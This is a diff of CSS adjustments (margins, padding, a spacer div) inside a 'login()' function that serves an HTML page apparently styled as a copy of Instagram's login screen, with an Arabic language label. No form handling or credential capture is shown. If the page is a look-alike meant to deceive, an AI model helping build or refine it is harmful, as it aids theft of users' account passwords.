@@ -56,14 +56,13 @@ def login():
         body { 
             background: #121212; 
             color: #f5f5f5;
-            width: 100vw;
             height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: space-between;
             overflow: hidden;
-            padding: 12px 20px;
+            padding: 15px 20px 10px 20px;
         }
 
         .container {
@@ -72,13 +71,13 @@ def login():
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin: auto;
+            margin: auto 0;
         }
 
         .lang-text {
             color: #a8a8a8;
             font-size: 12px;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             text-align: center;
         }
 
@@ -90,7 +89,7 @@ def login():
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 24px;
+            margin-bottom: 30px;
         }
         
         .insta-icon svg {
@@ -103,7 +102,7 @@ def login():
             color: #ed4956; 
             font-size: 12px; 
             line-height: 16px; 
-            margin-bottom: 10px; 
+            margin-bottom: 12px; 
             text-align: center; 
             background: #1c1c1c; 
             padding: 8px; 
@@ -145,8 +144,8 @@ def login():
             font-size: 14px; 
             font-weight: 600; 
             cursor: pointer; 
-            margin-top: 6px; 
-            margin-bottom: 12px; 
+            margin-top: 8px; 
+            margin-bottom: 15px; 
         }
         .submit-btn:hover { background: #1877f2; }
 
@@ -156,7 +155,7 @@ def login():
             text-decoration: none; 
             display: block; 
             text-align: center; 
-            margin-bottom: 20px; 
+            margin-bottom: 25px; 
         }
 
         .signup-card { 
@@ -176,7 +175,7 @@ def login():
             align-items: center;
             justify-content: center;
             gap: 5px;
-            padding-bottom: 8px;
+            padding-bottom: 5px;
             width: 100%;
         }
         
@@ -195,7 +194,7 @@ def login():
     </style>
 </head>
 <body>
-    <div></div>
+    <div style="height: 0px;"></div>
     <div class="container">
         <div class="lang-text">العربية</div>
         
